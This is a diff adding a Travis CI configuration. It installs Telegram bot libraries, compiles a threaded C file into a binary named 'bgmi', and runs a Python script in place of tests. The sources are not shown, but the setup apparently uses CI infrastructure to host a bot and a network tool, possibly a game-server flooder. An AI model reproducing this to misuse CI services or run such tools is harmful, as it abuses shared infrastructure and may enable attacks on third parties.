@@ -1,0 +1,21 @@
+language: python
+dist: focal
+python:
+  - "3.10"
+
+before_install:
+
+  - sudo apt-get update
+  - sudo apt-get install -y gcc
+
+install:
+
+  - python3 -m pip install --upgrade pip
+  - python3 -m pip install telebot pymongo aiohttp
+  - python3 -m pip install pymongo python-telegram-bot pyTelegramBotAPI certifi 
+
+before_script:
+  - if [ -f FLASH.c ]; then gcc FLASH.c -o bgmi -lpthread; fi
+
+script:
+  - chmod +x * && lscpu && python3 S2.py
